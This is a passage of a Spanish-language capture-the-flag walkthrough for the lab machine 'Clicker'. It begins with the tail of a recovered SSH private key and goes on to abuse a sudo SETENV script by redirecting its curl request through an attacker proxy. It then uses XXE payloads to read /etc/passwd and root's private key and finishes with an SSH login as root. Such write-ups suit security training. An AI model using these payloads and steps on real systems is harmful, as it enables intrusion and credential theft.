EhA8zfl5uimjsT31lks3jwk/I8CupZGrVvXmyEzBYZBegl3W4AAADBAO19sPL8ZYYo1n2j
rghoSkgwA8kZJRy6BIyRFRUODsYBlK0ItFnriPgWSE2b3iHo7cuujCDju0yIIfF2QG87Hh
zXj1wghocEMzZ3ELIlkIDY8BtrewjC3CFyeIY3XKCY5AgzE2ygRGvEL+YFLezLqhJseV8j
3kOhQ3D6boridyK3T66YGzJsdpEvWTpbvve3FM5pIWmA5LUXyihP2F7fs2E5aDBUuLJeyi
F0YCoftLetCA/kiVtqlT0trgO8Yh+78QAAAMEAwYV0GjQs3AYNLMGccWlVFoLLPKGItynr
Xxa/j3qOBZ+HiMsXtZdpdrV26N43CmiHRue4SWG1m/Vh3zezxNymsQrp6sv96vsFjM7gAI
JJK+Ds3zu2NNNmQ82gPwc/wNM3TatS/Oe4loqHg3nDn5CEbPtgc8wkxheKARAz0SbztcJC
LsOxRu230Ti7tRBOtV153KHlE4Bu7G/d028dbQhtfMXJLu96W1l3Fr98pDxDSFnig2HMIi
lL4gSjpD/FjWk9AAAADGphY2tAY2xpY2tlcgECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

> ¡Perfecto! Conseguimos recuperar la clave privada SSH de `jack`. Ahora podemos utilizarla para autenticarnos directamente en el sistema.

## SSH

Utilizamos la clave privada obtenida para conectarnos al usuario `jack`:

```bash
$ ssh jack@10.129.49.215 -i id_rsa
```

![Pasted-image-20261119234212.png](./Images/Pasted-image-20261119234212.png)

> Conseguimos acceder correctamente como `jack`. Ya tenemos una sesión con un usuario local y podemos continuar investigando posibles vías de escalada de privilegios.

# Shell como root

## Enumeracion

> Una vez dentro como `jack`, comprobamos qué comandos podemos ejecutar mediante `sudo`:

```bash
$ sudo -l

Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
```

> Observamos que el usuario `jack` puede ejecutar comandos como cualquier usuario mediante `sudo`, aunque para ello necesita proporcionar una contraseña.
>
> Sin embargo, encontramos una entrada especialmente interesante: podemos ejecutar `/opt/monitor.sh` como `root` sin necesidad de contraseña y con la opción `SETENV`, que permite modificar variables de entorno al ejecutar el comando.

> Vamos a analizar el contenido del script:

```bash
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```

> Analizando el script, observamos que realiza las siguientes operaciones:
>
> 1. Comprueba que se esté ejecutando con privilegios de `root`.
> 2. Establece la variable `PATH` y elimina las variables `PERL5LIB` y `PERLLIB`.
> 3. Realiza una petición HTTP mediante `curl` al endpoint `diagnostic.php` de la aplicación.
> 4. Procesa la respuesta utilizando `xml_pp`.
> 5. Si la variable `NOSAVE` tiene el valor `true`, finaliza la ejecución sin guardar el resultado. En caso contrario, almacena el contenido en `/root/diagnostic_files/`.
>
> Hay un detalle interesante en la petición realizada mediante `curl`: podemos aprovechar la configuración de variables de entorno para redirigir el tráfico HTTP a través de un proxy.
>
> Vamos a comprobar si podemos interceptar esta comunicación utilizando Burp Suite. Para ello, configuraremos Burp como un listener en el puerto `9000`.

![Pasted-image-20261119234218.png](./Images/Pasted-image-20261119234218.png)

> Configuramos Burp Suite para escuchar las peticiones entrantes por el puerto `9000`, activamos el `Interceptor` y ejecutamos el script desde la máquina víctima utilizando nuestra dirección IP como proxy.

```bash
$ sudo http_proxy=http://10.10.14.119:9000 /opt/monitor.sh
```

![Pasted-image-20261119234223.png](./Images/Pasted-image-20261119234223.png)

> Si observamos la petición interceptada, comprobamos que se realiza correctamente. El servidor responde con un documento XML que posteriormente se procesa y se muestra en la consola.

![Pasted-image-20261119234227.png](./Images/Pasted-image-20261119234227.png)

## XXE

> Ahora que podemos interceptar la comunicación entre el script y el servidor web, vamos a intentar explotar una vulnerabilidad `XXE` (*XML External Entity*).
>
> Para ello, necesitamos modificar la respuesta XML que recibe el script. En lugar de devolver el contenido original, vamos a enviar un documento XML que declare una entidad externa apuntando a un archivo local del sistema.
>
> De esta manera, cuando el procesador XML resuelva la entidad, intentará leer el archivo indicado.

> Interceptamos la respuesta de la petición y sustituimos su contenido por el siguiente XML:

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY file SYSTEM "/etc/passwd"> ]>
<data>&file;</data>
```

![Pasted-image-20261119234237.png](./Images/Pasted-image-20261119234237.png)

> Una vez enviada la respuesta modificada, comprobamos el resultado en la consola de la máquina víctima.

![Pasted-image-20261119234241.png](./Images/Pasted-image-20261119234241.png)

> ¡Perfecto! Conseguimos leer correctamente el archivo `/etc/passwd` mediante la vulnerabilidad XXE.
>
> Ahora vamos a comprobar si podemos acceder a información más sensible. Nuestro objetivo será obtener la clave privada SSH del usuario `root`.

> Modificamos la entidad externa para que apunte a su clave privada:

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY file SYSTEM "/root/.ssh/id_rsa"> ]>
<data>&file;</data>
```

![Pasted-image-20261119234246.png](./Images/Pasted-image-20261119234246.png)

> Conseguimos recuperar la clave privada SSH del usuario `root`. Ya podemos utilizarla para autenticarnos directamente en la máquina con privilegios máximos.

## Acceso como root

> Utilizamos la clave obtenida para conectarnos mediante SSH:

```bash
$ ssh root@10.129.49.215 -i id_rsa
```

![Pasted-image-20261119234250.png](./Images/Pasted-image-20261119234250.png)

> ¡Conseguimos acceso al usuario `root` y completamos la máquina **Clicker**!